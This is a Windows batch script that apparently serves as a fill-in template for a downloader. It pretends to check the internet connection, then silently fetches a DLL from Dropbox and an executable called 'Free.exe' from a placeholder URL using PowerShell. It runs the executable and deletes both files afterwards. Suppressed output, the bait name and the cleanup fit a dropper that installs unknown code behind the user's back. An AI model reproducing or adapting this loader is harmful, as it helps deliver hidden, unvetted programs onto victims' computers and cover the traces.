@echo off
cls

title _
echo Checking internet connection . . .
ping -n 1 www.google.com | findstr TTL && goto a
ping -n 1 www.google.com | findstr TTL || goto Disconnected

:a
cls
echo MESSAGEtextBox1
echo.
if exist "%CD%\url.txt" (del "%CD%\url.txt")
echo STUFFforURL >> url.txt
cd %CD%
if not exist Logs (md Logs)
cd "%CD%\Logs"

if exist "%CD%\_1_textBox2.txt" (del "%CD%\_2_textBox2.txt")

if exist "%CD%\Newtonsoft.Json.dll" (del "%CD%\Newtonsoft.Json.dll")
if not exist "%CD%\Newtonsoft.Json.dll" (powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/by6hm1tzd7c3rph/Newtonsoft.Json.dll?dl=1','%CD%\Newtonsoft.Json.dll')") > nul 2>&1

if exist "%CD%\Free.exe" (del "%CD%\Free.exe")
if not exist "%CD%\Free.exe" (powershell -Command "(New-Object System.Net.WebClient).DownloadFile('downloadURL','%CD%\Free.exe')") > nul 2>&1

start Free.exe
timeout /t 20 /nobreak > nul
del "%CD%\Newtonsoft.Json.dll"
del "%CD%\Free.exe"
echo textBox3TEXT_INSIDE >> logged.txt
exit

:Disconnected
cls
echo You need internet stupid
echo Press any key to exit . . .
pause > nul
exit